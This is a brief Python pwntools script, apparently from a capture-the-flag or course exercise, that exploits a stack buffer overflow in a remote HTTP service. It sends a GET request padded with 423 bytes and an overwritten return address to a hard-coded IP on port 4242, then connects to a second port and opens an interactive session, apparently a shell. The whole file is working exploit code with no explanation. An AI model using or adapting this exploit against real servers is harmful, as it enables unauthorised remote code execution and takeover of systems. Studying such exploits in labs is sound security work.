from pwn import *

payload = b"GET /"

io = remote("141.85.224.104", 4242)

payload += 423 * b"A"
payload += p32(0x8049378)
payload += b" HTTP/1.1"
io.sendline(payload)

sleep(1)
io = remote("141.85.224.104", 42042)
io.interactive()